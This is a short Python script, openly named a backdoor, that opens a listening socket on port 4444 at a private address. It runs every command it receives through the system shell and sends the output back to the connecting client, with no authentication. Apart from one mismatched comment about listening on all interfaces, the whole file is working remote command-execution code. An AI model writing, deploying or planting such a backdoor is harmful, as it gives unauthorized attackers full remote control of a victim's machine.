import socket
import subprocess

def execute_command(command):
    """Executes a system command and returns the output."""
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
    except subprocess.CalledProcessError as e:
        output = str(e.output)
    return output

def backdoor_listener(host, port):
    """Sets up a listening socket to accept commands and execute them."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"Listening as {host}:{port}...")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}...")
            
            with client_socket:
                while True:
                    try:
                        command = client_socket.recv(1024).decode('utf-8')
                        if not command or command.lower() == 'exit':
                            break
                        command_output = execute_command(command)
                        client_socket.send(command_output.encode('utf-8'))
                    except Exception as e:
                        print(f"Error: {e}")
                        break

if __name__ == "__main__":
    HOST = '10.0.2.5'  # Listen on all interfaces
    PORT = 4444       # Port to listen on (non-privileged ports are > 1023)
    backdoor_listener(HOST, PORT)
